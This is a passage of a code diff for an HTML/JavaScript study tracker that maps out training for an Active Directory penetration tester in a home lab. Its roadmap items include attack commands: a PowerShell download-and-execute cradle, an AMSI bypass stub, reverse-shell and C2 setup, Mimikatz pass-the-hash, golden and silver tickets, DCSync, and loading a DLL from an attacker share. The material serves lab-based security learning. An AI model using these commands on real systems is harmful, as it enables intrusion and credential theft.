@@ -2,8 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Titan Tracker v9 (Stable)</title>
+<title>Titan Tracker v11 - Apex</title>
 <style>
     :root {
         --bg-color: #0b0c15;
@@ -12,16 +11,9 @@
         --primary: #6c5ce7;
         --accent: #00cec9;
         --success: #00b894;
+        --danger: #d63031;
         --text: #ffffff;
         --text-muted: #b2bec3;
-
-        /* Table Status Colors */
-        --st-todo: #636e72;
-        --st-scan: #f9ca24;
-        --st-foot: #f0932b;
-        --st-priv: #be2edd;
-        --st-root: #6ab04c;
-        --st-stuck: #eb4d4b;
     }
 
     body {
@@ -33,12 +25,12 @@
         overflow: hidden;
     }
 
-    /* --- ANIMATED BACKGROUND --- */
+    /* --- BACKGROUND --- */
     .nebula-bg {
         position: fixed; top: 0; left: 0; width: 100%; height: 100%;
         background: linear-gradient(125deg, #0b0c15, #1e0b2b, #091c2b);
         background-size: 400% 400%;
-        animation: gradientBG 15s ease infinite;
+        animation: gradientBG 20s ease infinite;
         z-index: -2;
     }
     .grid-overlay {
@@ -50,102 +42,134 @@
     @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
     /* --- LAYOUT --- */
-    .app-container {
-        display: flex; flex-direction: column; height: 100%;
-        max-width: 1400px; margin: 0 auto; padding: 20px; box-sizing: border-box;
-    }
+    .app-container { display: flex; flex-direction: column; height: 100%; max-width: 1400px; margin: 0 auto; padding: 20px; box-sizing: border-box; }
 
     /* --- HEADER --- */
     .header {
         display: flex; justify-content: space-between; align-items: center;
         background: var(--glass-panel); backdrop-filter: blur(12px);
-        border: 1px solid var(--glass-border); padding: 20px 30px;
-        border-radius: 20px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        border: 1px solid var(--glass-border); padding: 15px 30px;
+        border-radius: 16px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        animation: slideDown 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
     }
-    .header h1 { margin: 0; font-size: 1.5rem; letter-spacing: 1px; background: linear-gradient(to right, #fff, #a29bfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    @keyframes slideDown { from { transform: translateY(-50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+    .header h1 { margin: 0; font-size: 1.4rem; letter-spacing: 2px; background: linear-gradient(to right, #fff, #a29bfe); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase;}
     
     .countdown-pill {
-        background: rgba(214, 48, 49, 0.2); color: #ff7675;
+        background: rgba(214, 48, 49, 0.15); color: #ff7675;
         padding: 5px 15px; border-radius: 20px; font-size: 0.8rem;
         font-weight: bold; border: 1px solid rgba(214, 48, 49, 0.3);
-        margin-left: 10px;
+        margin-left: 10px; animation: pulseRed 3s infinite;
     }
+    @keyframes pulseRed { 0% { box-shadow: 0 0 0 0 rgba(214, 48, 49, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(214, 48, 49, 0); } 100% { box-shadow: 0 0 0 0 rgba(214, 48, 49, 0); } }
 
     .progress-wrapper { text-align: right; width: 300px; }
-    .progress-bar-bg { background: rgba(255,255,255,0.1); height: 10px; border-radius: 5px; overflow: hidden; margin-top: 5px; }
-    .progress-fill { height: 100%; background: linear-gradient(90deg, var(--primary), var(--accent)); width: 0%; transition: width 0.5s ease; }
+    .progress-bar-bg { background: rgba(255,255,255,0.1); height: 8px; border-radius: 5px; overflow: hidden; margin-top: 5px; }
+    
+    /* Liquid Progress Bar Animation */
+    .progress-fill { 
+        height: 100%; width: 0%; 
+        background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary));
+        background-size: 200% 100%;
+        animation: liquidFlow 3s linear infinite;
+        transition: width 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
+    @keyframes liquidFlow { 0% { background-position: 100% 0; } 100% { background-position: -100% 0; } }
 
     /* --- VIEWS --- */
     .viewport { flex: 1; position: relative; overflow: hidden; }
     .view {
         position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-        transition: transform 0.4s ease, opacity 0.4s ease;
-        overflow-y: auto; padding-bottom: 50px;
+        transition: 0.5s cubic-bezier(0.2, 0.8, 0.2, 1);
+        overflow-y: auto; padding-bottom: 50px; padding-right: 5px;
     }
-    .view.hidden { transform: translateX(-20px); opacity: 0; pointer-events: none; }
-    
-    /* Scrollbar */
-    ::-webkit-scrollbar { width: 8px; }
+    .view.hidden { transform: translateX(50px) scale(0.95); opacity: 0; pointer-events: none; }
+    ::-webkit-scrollbar { width: 6px; }
     ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 4px; }
 
-    /* --- MAP --- */
-    .map-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; padding: 10px; }
+    /* --- MAP CARDS (Enhanced) --- */
+    .map-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; padding: 10px; }
     .phase-card {
         background: var(--glass-panel); border: 1px solid var(--glass-border);
-        border-radius: 16px; padding: 25px; cursor: pointer; transition: 0.3s;
-        position: relative; overflow: hidden;
+        border-radius: 16px; padding: 20px; cursor: pointer; transition: 0.4s;
+        position: relative; overflow: hidden; display: flex; flex-direction: column;
+        opacity: 0; transform: translateY(30px); /* Setup for entry animation */
+        animation: cardEntry 0.6s forwards;
     }
-    .phase-card:hover { transform: translateY(-5px); border-color: var(--accent); }
-    .phase-icon { font-size: 2.5rem; margin-bottom: 10px; }
+    @keyframes cardEntry { to { opacity: 1; transform: translateY(0); } }
+
+    /* Holographic Hover */
+    .phase-card:hover { 
+        transform: translateY(-5px) scale(1.02); 
+        border-color: var(--accent); 
+        box-shadow: 0 15px 30px rgba(0, 206, 201, 0.15), inset 0 0 20px rgba(0, 206, 201, 0.05);
+    }
+    .phase-card::after {
+        content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
+        background: linear-gradient(transparent, rgba(255,255,255,0.03), transparent);
+        transform: rotate(45deg); transition: 0.5s; opacity: 0; pointer-events: none;
+    }
+    .phase-card:hover::after { opacity: 1; transform: rotate(45deg) translateY(-20px); }
+
+    .phase-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; }
+    .phase-icon { font-size: 2.2rem; filter: drop-shadow(0 0 10px rgba(108, 92, 231, 0.5)); }
     .phase-num { font-size: 0.7rem; text-transform: uppercase; color: var(--text-muted); letter-spacing: 2px; }
-    .phase-title { font-size: 1.2rem; margin: 5px 0 10px; font-weight: 700; }
-    .mini-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); margin-top: 15px; border-radius: 2px; }
+    .phase-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 5px; }
+    .deadline-badge { 
+        font-size: 0.7rem; color: #ff7675; font-weight: bold; 
+        background: rgba(214, 48, 49, 0.1); padding: 4px 8px; border-radius: 4px; 
+        display: inline-block; margin-bottom: 15px; border: 1px solid rgba(214, 48, 49, 0.2);
+    }
+    
+    .mini-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); margin-top: auto; border-radius: 2px; overflow: hidden; }
+    .mini-fill { height: 100%; transition: width 1s ease; }
 
-    /* --- DETAILS --- */
+    /* --- DETAILS VIEW --- */
     .detail-nav { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px;}
-    .back-btn { background: transparent; border: 1px solid var(--accent); color: var(--accent); padding: 8px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; }
-    .back-btn:hover { background: var(--accent); color: #000; }
+    .back-btn { background: transparent; border: 1px solid var(--accent); color: var(--accent); padding: 8px 20px; border-radius: 20px; cursor: pointer; font-weight: bold; transition: 0.2s;}
+    .back-btn:hover { background: var(--accent); color: #000; box-shadow: 0 0 15px var(--accent); }
 
-    /* --- MISSION CARD (Expandable) --- */
-    .mission-container { display: flex; flex-direction: column; gap: 15px; }
+    /* --- MISSION CARD (Subtopics) --- */
+    .mission-container { display: flex; flex-direction: column; gap: 10px; }
     .mission-card {
         background: rgba(30, 30, 50, 0.6); border: 1px solid var(--glass-border);
-        border-radius: 12px; overflow: hidden; transition: 0.3s;
+        border-radius: 10px; overflow: hidden; transition: 0.3s;
     }
-    .mission-card:hover { border-color: rgba(255,255,255,0.3); }
+    .mission-card:hover { border-color: rgba(255,255,255,0.3); background: rgba(40, 40, 60, 0.7); }
     
     .m-header {
-        padding: 15px 20px; display: flex; justify-content: space-between; align-items: center;
+        padding: 12px 20px; display: flex; justify-content: space-between; align-items: center;
         cursor: pointer; background: rgba(255,255,255,0.02);
     }
-    .m-title { font-weight: bold; font-size: 1.05rem; }
-    .m-date { font-size: 0.8rem; color: var(--success); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+    .m-title { font-weight: bold; font-size: 0.95rem; display: flex; align-items: center; gap: 10px; }
+    .m-num { font-size: 0.7rem; color: #666; font-family: monospace; }
+    .m-date { font-size: 0.75rem; color: var(--success); font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
 
     .m-body {
         max-height: 0; overflow: hidden; transition: max-height 0.4s ease;
         border-top: 1px solid transparent; background: rgba(0,0,0,0.2);
     }
-    .mission-card.open .m-body { max-height: 800px; border-top-color: var(--glass-border); }
+    .mission-card.open .m-body { max-height: 600px; border-top-color: var(--glass-border); }
     .m-content { padding: 20px; }
     
-    .lbl { font-size: 0.7rem; font-weight: bold; margin-bottom: 5px; display: block; letter-spacing: 1px;}
-    .m-desc { color: var(--text-muted); font-size: 0.9rem; margin-bottom: 15px; line-height: 1.5; }
+    .lbl { font-size: 0.65rem; font-weight: bold; margin-bottom: 5px; display: block; letter-spacing: 1px; color: var(--accent); opacity: 0.8;}
+    .m-desc { color: var(--text-muted); font-size: 0.85rem; margin-bottom: 15px; line-height: 1.5; }
     .m-cmd { 
-        background: #151520; padding: 10px; border-radius: 6px; 
-        font-family: monospace; color: var(--accent); font-size: 0.85rem; margin-bottom: 15px;
-        border-left: 3px solid var(--accent);
+        background: #101018; padding: 12px; border-radius: 5px; 
+        font-family: 'Consolas', monospace; color: var(--success); font-size: 0.8rem; margin-bottom: 15px;
+        border-left: 3px solid var(--success); overflow-x: auto;
     }
     .m-notes {
         width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
-        color: white; padding: 10px; border-radius: 6px; font-family: inherit; margin-bottom: 10px; min-height: 60px;
+        color: white; padding: 10px; border-radius: 6px; font-family: inherit; margin-bottom: 10px; min-height: 50px;
     }
     .m-btn {
-        width: 100%; padding: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase;
+        width: 100%; padding: 10px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 1px;
         background: var(--glass-border); color: #aaa; transition: 0.2s;
     }
-    .m-btn:hover { background: var(--accent); color: #000; }
+    .m-btn:hover { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent); }
     
-    /* Mastered State */
     .mission-card.mastered { border-color: var(--success); background: rgba(0, 184, 148, 0.05); }
     .mission-card.mastered .m-btn { background: var(--success); color: #000; }
 
@@ -159,19 +183,19 @@
     .wr-row {
         background: rgba(30, 30, 50, 0.5); border: 1px solid var(--glass-border);
         border-radius: 8px; padding: 10px; margin-bottom: 10px;
-        display: grid; grid-template-columns: 50px 1.5fr 1fr 1fr 1.5fr 2fr; gap: 10px;
-        align-items: center;
+        display: grid; grid-template-columns: 40px 1.5fr 1fr 1fr 1.5fr 2fr; gap: 10px;
+        align-items: center; transition: 0.3s;
     }
-    .wr-row[data-status="root"] { border-left: 4px solid var(--st-root); }
+    .wr-row:hover { background: rgba(255,255,255,0.05); transform: translateX(5px); }
+    .wr-row[data-status="root"] { border-left: 4px solid var(--success); }
     .wr-input {
         background: transparent; border: none; border-bottom: 1px solid #444; width: 100%;
-        color: #ddd; padding: 4px; font-family: monospace;
+        color: #ddd; padding: 4px; font-family: monospace; font-size: 0.85rem;
     }
+    .wr-input:focus { border-color: var(--accent); outline: none; }
     .wr-select {
-        background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; width: 100%; padding: 5px;
+        background: rgba(0,0,0,0.3); border: 1px solid #444; color: #fff; width: 100%; padding: 5px; font-size: 0.75rem;
     }
-    
-    /* Reset Button */
     .reset-btn { position: fixed; bottom: 10px; right: 10px; font-size: 0.7rem; color: #555; cursor: pointer; }
 
 </style>
@@ -182,18 +206,17 @@
 <div class="grid-overlay"></div>
 
 <div class="app-container">
-    
     <div class="header">
         <div class="header-info">
             <div style="display:flex; align-items:center;">
-                <h1>TITAN TRACKER</h1>
+                <h1>TITAN TRACKER v11</h1>
                 <div class="countdown-pill" id="countdown">Loading...</div>
             </div>
-            <p>Target: Infrastructure Penetration Tester ($600+) • Deadline: June 2026</p>
+            <p>Target: Infrastructure Penetration Tester ($600+) • Deadline: June 1, 2026</p>
         </div>
         <div class="progress-wrapper">
             <div style="display:flex; justify-content:space-between;">
-                <span class="progress-text" style="color:white; font-size:0.7rem;">OVERALL COMPLETION</span>
+                <span class="progress-text" style="color:white; font-size:0.7rem;">CAREER PROGRESS</span>
                 <span class="progress-text" id="global-percent">0%</span>
             </div>
             <div class="progress-bar-bg">
@@ -203,95 +226,175 @@
     </div>
 
     <div class="viewport">
-        
         <div id="view-map" class="view">
             <div class="map-grid" id="card-container"></div>
         </div>
 
         <div id="view-detail" class="view hidden">
             <div class="detail-nav">
-                <button class="back-btn" onclick="goHome()">❮ RETURN TO MAP</button>
+                <button class="back-btn" onclick="goHome()">❮ OPs CENTER</button>
                 <div style="text-align: right;">
-                    <small style="color:#888; letter-spacing:2px; display:block;">OPERATIONAL PHASE</small>
-                    <span style="font-size:1.5rem; font-weight:bold;" id="dt-title">Title</span>
+                    <small style="color:#888; letter-spacing:2px; display:block;">PHASE INTEL</small>
+                    <span style="font-size:1.2rem; font-weight:bold;" id="dt-title">Title</span>
                 </div>
             </div>
-            
             <div class="mission-container" id="mission-container"></div>
             <div class="wr-container" id="war-room"></div>
         </div>
-
     </div>
 </div>
 
-<div class="reset-btn" onclick="hardReset()">Reset Data</div>
+<div class="reset-btn" onclick="hardReset()">Factory Reset</div>
 
 <script>
-    // --- 1. DATA (Detailed Checkpoints) ---
+    // --- 1. THE DATA (15 Items Per Phase) ---
     const roadmap = [
         { 
-            id: 0, type: 'check', title: "Infrastructure (The Lab)", icon: "🏗️", 
+            id: 0, type: 'check', title: "Infrastructure (Lab)", icon: "🏗️", deadline: "Dec 25, 2025",
             items: [
-                { title: "Virtualization Engine", desc: "Install VMware Workstation Pro (Recommended) or VirtualBox. Enable VT-x/AMD-V in BIOS. Configure a custom NAT Network (e.g., 192.168.56.0/24) to isolate lab from home WiFi.", cmd: "Network Editor -> VMnet8 -> Subnet IP: 192.168.56.0" },
-                { title: "Domain Controller Setup", desc: "Install Windows Server 2019. Set Static IP (192.168.56.10). Rename PC to 'DC01'. Install AD DS Role. Promote to Domain Controller. Create Forest 'corp.local'.", cmd: "Install-WindowsFeature AD-Domain-Services -IncludeManagementTools" },
-                { title: "AD Structure & Users", desc: "Open AD Users & Computers. Create OUs: 'IT', 'HR', 'Sales'. Create Service Accounts (sql_svc). Create 5 dummy users. **Critical:** Give one user 'Do not require Kerberos pre-auth'.", cmd: "New-ADUser -Name 'JDoe' -Path 'OU=IT,DC=corp,DC=local' -Enabled $true" },
-                { title: "Attack Box Configuration", desc: "Install Kali Linux. Update Repos. Edit /etc/hosts to point 'dc01.corp.local' to 192.168.56.10. Ensure ping connectivity.", cmd: "echo '192.168.56.10 dc01.corp.local' >> /etc/hosts" },
-                { title: "Blue Team Logging", desc: "Install Splunk Free on a standalone VM (Ubuntu or Win). Install Universal Forwarder on the DC to ship 'Security' logs to Splunk.", cmd: "inputs.conf: [WinEventLog://Security] disabled = 0" }
+                { title: "Hypervisor Selection", desc: "Install VMware Workstation Pro (Snapshot capabilities) or VirtualBox. Enable Nested Virtualization in CPU settings.", cmd: "BIOS: Enable VT-x / AMD-V" },
+                { title: "Network Isolation", desc: "Configure a Host-Only or NAT network (e.g., 192.168.56.0/24) to ensure lab traffic doesn't leak to your ISP.", cmd: "VMware Network Editor -> VMnet8" },
+                { title: "DC Installation", desc: "Deploy Windows Server 2019. Set static IP (192.168.56.10). Rename to DC01.", cmd: "sconfig -> Network Settings" },
+                { title: "Promote to DC", desc: "Install AD DS Role. Create new Forest 'corp.local'. Set DSRM password.", cmd: "Install-ADDSForest -DomainName corp.local" },
+                { title: "Attack Box Setup", desc: "Deploy Kali Linux. Update repositories. Install VS Code. Set static IP (192.168.56.5).", cmd: "apt update && apt install code-oss" },
+                { title: "Windows 10 Client", desc: "Deploy Win10 Enterprise. Join domain 'corp.local'. Install RSAT tools for management.", cmd: "Add-Computer -DomainName corp.local" },
+                { title: "OU Structure", desc: "Create realistic hierarchy: Tier 0 (Admins), Tier 1 (Servers), Tier 2 (Workstations).", cmd: "New-ADOrganizationalUnit -Name 'Tier0'" },
+                { title: "User Population", desc: "Create 5-10 dummy users with varied passwords. Create 'Service Accounts' OU.", cmd: "New-ADUser -Name 'JSmith' -Path 'OU=HR...'" },
+                { title: "Vulnerable: Pre-Auth", desc: "Set 'Do not require Kerberos pre-authentication' on one user.", cmd: "Set-ADAccountControl -Identity 'victim' -DoesNotRequirePreAuth $true" },
+                { title: "Vulnerable: SPN", desc: "Register a Service Principal Name to a user account for Kerberoasting.", cmd: "setspn -A MSSQL/sql01.corp.local sql_svc" },
+                { title: "Logging: Splunk", desc: "Install Splunk Free on a Linux VM. Open port 9997 for receiving.", cmd: "dpkg -i splunk.deb" },
+                { title: "Logging: Sysmon", desc: "Install Sysmon on DC01 using SwiftOnSecurity config for granular process logging.", cmd: "sysmon64.exe -i config.xml" },
+                { title: "GPO: RDP Access", desc: "Create GPO allowing RDP access for specific groups (simulate misconfig).", cmd: "GPO: Computer config -> Admin Templates -> Windows Comp -> RDS" },
+                { title: "File Shares", desc: "Create an SMB share with 'Everyone: Read' permissions containing a 'passwords.txt'.", cmd: "New-SmbShare -Name 'IT_Backup' -Path 'C:\\Share'" },
+                { title: "Snapshots", desc: "Take clean snapshots of all VMs before starting attacks. This is your 'Reset Button'.", cmd: "VMware: Snapshot Manager -> 'Clean State'" }
             ]
         },
         { 
-            id: 1, type: 'check', title: "Foundations & Theory", icon: "🧠", 
+            id: 1, type: 'check', title: "Foundations & Theory", icon: "🧠", deadline: "Jan 15, 2026",
             items: [
-                { title: "Kerberos: AS-REQ / AS-REP", desc: "Authentication Service. User sends timestamp encrypted with their hash. KDC replies with TGT. *Vulnerability:* If pre-auth disabled -> AS-REP Roasting.", cmd: "Wireshark Filter: kerberos.msg_type == 10 (AS-REQ)" },
-                { title: "Kerberos: TGS-REQ / TGS-REP", desc: "Ticket Granting Service. User presents TGT to request access to a Service (SPN). KDC returns Service Ticket. *Vulnerability:* TGS-REP contains Service Hash -> Kerberoasting.", cmd: "Wireshark Filter: kerberos.msg_type == 12 (TGS-REQ)" },
-                { title: "NTLMv2 Handshake", desc: "Understand the Challenge/Response mechanism. 1. Negotiate, 2. Challenge, 3. Authenticate. *Vulnerability:* Relay attacks (SMBRelay).", cmd: "Tool: Responder -I eth0 -wrf" }
+                { title: "Kerberos Anatomy", desc: "Master the 6 steps: AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ, AP-REP.", cmd: "Study RFC 1510 diagrams" },
+                { title: "NTLMv2 Process", desc: "Understand Negotiate, Challenge, Authenticate. Why is it vulnerable to Relay?", cmd: "Wireshark: NTLMSSP filter" },
+                { title: "LDAP Filters", desc: "Learn LDAP query syntax. How to find all admins? All SPNs?", cmd: "(&(objectClass=user)(servicePrincipalName=*))" },
+                { title: "Access Tokens", desc: "Primary vs Impersonation tokens. Integrity levels (Medium, High, System).", cmd: "whoami /groups /priv" },
+                { title: "ACLs & ACEs", desc: "Discretionary Access Control Lists. This is the modern AD attack surface.", cmd: "Get-Acl | select -ExpandProperty Access" },
+                { title: "PowerShell Pipeline", desc: "Understanding objects vs text. Using $_ for current item.", cmd: "Get-Service | Where-Object {$_.Status -eq 'Running'}" },
+                { title: "Global Catalog", desc: "Role of the GC in multi-domain forests. Port 3268 vs 389.", cmd: "Get-ADForest | select GlobalCatalogs" },
+                { title: "FSMO Roles", desc: "Schema Master, Domain Naming, RID, PDC Emulator, Infrastructure.", cmd: "netdom query fsmo" },
+                { title: "DNS Records", desc: "SRV records identify DCs. If DNS fails, AD fails.", cmd: "nslookup -type=SRV _ldap._tcp.corp.local" },
+                { title: "Group Scopes", desc: "Domain Local vs Global vs Universal. Nesting rules.", cmd: "Review MS Docs on Group Scope" },
+                { title: "Trust Relationships", desc: "Parent-Child, Tree-Root, Forest, Shortcut, External. Direction of access.", cmd: "Get-ADTrust -Filter *" },
+                { title: "SID History", desc: "How migration history preserves access (and can be abused).", cmd: "Get-ADUser -Properties SIDHistory" },
+                { title: "NetBIOS/LLMNR", desc: "Legacy name resolution protocols used for poisoning (Responder).", cmd: "Theory: Why is this default on?" },
+                { title: "LAPS Theory", desc: "Local Admin Password Solution. Why it stops lateral movement.", cmd: "Read: LAPS Architecture" },
+                { title: "Tier Model", desc: "The concept of separating Admin tiers (T0/T1/T2) to prevent escalation.", cmd: "Read: MS Enterprise Access Model" }
             ]
         },
         { 
-            id: 2, type: 'check', title: "Weaponization", icon: "⚔️", 
+            id: 2, type: 'check', title: "Weaponization", icon: "⚔️", deadline: "Feb 05, 2026",
             items: [
-                { title: "PowerShell Execution Policy", desc: "Bypass restrictions. Run scripts in memory without touching disk to evade basic AV.", cmd: "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.56.5/script.ps1')\"" },
-                { title: "Tool Compilation", desc: "Defender flags default Rubeus.exe. Download source from GitHub, open in Visual Studio, change Assembly Info, compile Release build.", cmd: "csc.exe /target:exe /out:MyRubeus.exe Rubeus.cs" },
-                { title: "C2 Framework", desc: "Setup Sliver C2. Generate a beacon. Execute on victim. Test 'whoami' connectivity.", cmd: "./sliver-server -> generate --mtls 192.168.56.5" }
+                { title: "Execution Policy", desc: "Bypass PS restrictions. Run memory-only payloads.", cmd: "powershell -ep bypass -nop" },
+                { title: "AMSI Bypass", desc: "Defeating Antimalware Scan Interface to run malicious PS.", cmd: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')..." },
+                { title: "Compile Rubeus", desc: "Build Rubeus from source. Change AssemblyInfo to evade signatures.", cmd: "Visual Studio -> Build -> Release" },
+                { title: "Compile Mimikatz", desc: "Build Mimikatz from source. Understand the modules.", cmd: "msbuild mimikatz.sln" },
+                { title: "Python Impacket", desc: "Install Impacket toolkit. The backbone of Linux-based AD attacks.", cmd: "pip3 install impacket" },
+                { title: "Bloodhound", desc: "Install Bloodhound GUI and Neo4j database.", cmd: "apt install bloodhound neo4j" },
+                { title: "C2: Sliver", desc: "Setup Sliver Server. Generate http/mtls beacons.", cmd: "./sliver-server -> generate --mtls 192.168.x.x" },
+                { title: "C2: Listeners", desc: "Configure jobs/listeners to catch callbacks.", cmd: "sliver > mtls" },
+                { title: "Obfuscation", desc: "Use Invoke-Obfuscation to hide PowerShell intent.", cmd: "Import-Module ./Invoke-Obfuscation.psd1" },
+                { title: "Reverse Shells", desc: "Master basic shells: Netcat, PowerShell one-liners.", cmd: "$client = New-Object System.Net.Sockets.TCPClient..." },
+                { title: "File Transfer", desc: "Certutil, Bitsadmin, SMB, Python HTTP Server.", cmd: "python3 -m http.server 80" },
+                { title: "Port Forwarding", desc: "Chisel or SSH tunneling to pivot into internal networks.", cmd: "./chisel server -p 8000 --reverse" },
+                { title: "Metasploit", desc: "Setup multi/handler. Create msfvenom payloads.", cmd: "msfvenom -p windows/x64/meterpreter..." },
+                { title: "CrackMapExec", desc: "Learn CME for mass spraying/execution.", cmd: "crackmapexec smb 192.168.56.0/24" },
+                { title: "Responder", desc: "Configure Responder.conf. Turn off HTTP/SMB for Relay attacks.", cmd: "nano /etc/responder/Responder.conf" }
             ]
         },
         { 
-            id: 3, type: 'check', title: "Enumeration (Recon)", icon: "🔍", 
+            id: 3, type: 'check', title: "Enumeration (Recon)", icon: "🔍", deadline: "Feb 25, 2026",
             items: [
-                { title: "Bloodhound Data Collection", desc: "Run SharpHound.exe from a non-admin user context. Collect All properties. Exfiltrate the zip file.", cmd: ".\\SharpHound.exe -c All" },
-                { title: "Analysis: Shortest Path", desc: "Import data to Neo4j. Query: 'Find Shortest Path to Domain Admins'. Look for 'ForceChangePassword' or 'GenericAll'.", cmd: "Cypher: MATCH p=shortestPath((u:User)-[r*1..]->(g:Group {name:'DOMAIN ADMINS'})) RETURN p" },
-                { title: "PowerView: ACL Hunting", desc: "Find objects where 'Everyone' or 'Authenticated Users' have Write access.", cmd: "Get-DomainObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match 'S-1-1-0'}" }
+                { title: "Nmap Scanning", desc: "Scan DC for open ports (88, 445, 389, 3268).", cmd: "nmap -Pn -sV -p- 192.168.56.10" },
+                { title: "SMB Signing", desc: "Check if SMB signing is required (Relay target?).", cmd: "nmap --script smb-security-mode" },
+                { title: "SharpHound", desc: "Run the collector from a domain-joined machine.", cmd: "./SharpHound.exe -c All" },
+                { title: "Bloodhound Analysis", desc: "Map path to Domain Admin. Find 'Shortest Path'.", cmd: "Neo4j Query: Shortest Path to DA" },
+                { title: "PowerView: Domain", desc: "Get basic domain controller info and policy.", cmd: "Get-NetDomain; Get-DomainPolicy" },
+                { title: "PowerView: Users", desc: "Dump users, look for descriptions with passwords.", cmd: "Get-NetUser | select name,description" },
+                { title: "PowerView: Groups", desc: "Enumerate members of Domain Admins.", cmd: "Get-NetGroupMember 'Domain Admins'" },
+                { title: "Local Admin Hunt", desc: "Find machines where current user is Admin.", cmd: "Find-LocalAdminAccess" },
+                { title: "User Hunting", desc: "Where are high-value users logged in?", cmd: "Invoke-UserHunter" },
+                { title: "GPO Enumeration", desc: "List all GPOs. Look for Restricted Groups.", cmd: "Get-NetGPO | select displayname" },
+                { title: "ACL Scanning", desc: "Find objects with 'GenericAll' or 'WriteDacl'.", cmd: "Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs" },
+                { title: "SPN Scanning", desc: "Find Kerberoastable service accounts.", cmd: "Get-NetUser -SPN" },
+                { title: "AD Explorer", desc: "Use Sysinternals AD Explorer for GUI navigation.", cmd: "Connect to DC01" },
+                { title: "LDAPSearch", desc: "Query AD from Linux.", cmd: "ldapsearch -x -h 192.168.56.10 -b 'dc=corp,dc=local'" },
+                { title: "Share Enumeration", desc: "Find readable SMB shares across the network.", cmd: "Invoke-ShareFinder -CheckShareAccess" }
             ]
         },
         { 
-            id: 4, type: 'check', title: "Red Team (Attack)", icon: "🚩", 
+            id: 4, type: 'check', title: "Red Team (Attack)", icon: "🚩", deadline: "Mar 20, 2026",
             items: [
-                { title: "AS-REP Roasting", desc: "Identify users without pre-auth. Request ticket. Crack hash offline.", cmd: "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt" },
-                { title: "Kerberoasting", desc: "Request TGS for all SPNs. Export tickets. Crack with Hashcat mode 13100.", cmd: "Rubeus.exe kerberoast /nowrap" },
-                { title: "Pass-The-Hash", desc: "Use NTLM hash of an admin to authenticate without knowing the password.", cmd: "mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH" },
-                { title: "Golden Ticket", desc: "Compromise KRBTGT account. Forge a TGT valid for 10 years. Total domain dominance.", cmd: "mimikatz # kerberos::golden /user:FakeUser /domain:corp.local /sid:S-1-5... /krbtgt:HASH /id:500" }
+                { title: "AS-REP Roasting", desc: "Attack users with pre-auth disabled.", cmd: "Rubeus.exe asreproast /format:hashcat" },
+                { title: "Kerberoasting", desc: "Request TGS for SPNs. Crack offline.", cmd: "Rubeus.exe kerberoast /outfile:hashes.txt" },
+                { title: "Pass-The-Hash", desc: "Use NTLM hash to authenticate.", cmd: "sekurlsa::pth /user:admin /domain:corp /ntlm:xxx" },
+                { title: "Over-Pass-The-Hash", desc: "Trade NTLM hash for a Kerberos TGT.", cmd: "Rubeus.exe asktgt /user:admin /rc4:xxx" },
+                { title: "Silver Ticket", desc: "Forge Service Ticket. Persistence on specific server.", cmd: "mimikatz kerberos::golden /sid:.. /target:.. /service:cifs" },
+                { title: "Golden Ticket", desc: "Forge TGT using KRBTGT hash. Total control.", cmd: "mimikatz kerberos::golden /krbtgt:.. /user:fake /id:500" },
+                { title: "DCSync", desc: "Simulate Replication to steal hashes.", cmd: "lsadump::dcsync /domain:corp /user:Administrator" },
+                { title: "Token Impersonation", desc: "Steal tokens from running processes.", cmd: "incognito -> list_tokens -u -> impersonate_token" },
+                { title: "Unconstrained Deleg", desc: "Compromise server, wait for DA, dump TGT.", cmd: "Rubeus.exe monitor /interval:5" },
+                { title: "Constrained Deleg", desc: "S4U2Self/S4U2Proxy abuse.", cmd: "Rubeus.exe s4u /impersonateuser:admin /msdsspn:..." },
+                { title: "RBCD", desc: "Resource Based Constrained Delegation.", cmd: "Set-ADComputer -Identity Target -PrincipalsAllowedToDelegate..." },
+                { title: "Shadow Credentials", desc: "Abuse msDS-KeyCredentialLink (Whisker).", cmd: "Whisker.exe add /target:DC01" },
+                { title: "DNSAdmins", desc: "Inject DLL via DNS Service.", cmd: "dnscmd /config /serverlevelplugindll \\\\attacker\\share\\dll" },
+                { title: "GPO Abuse", desc: "Modify GPO to add user or run script.", cmd: "New-GPOImmediateTask" },
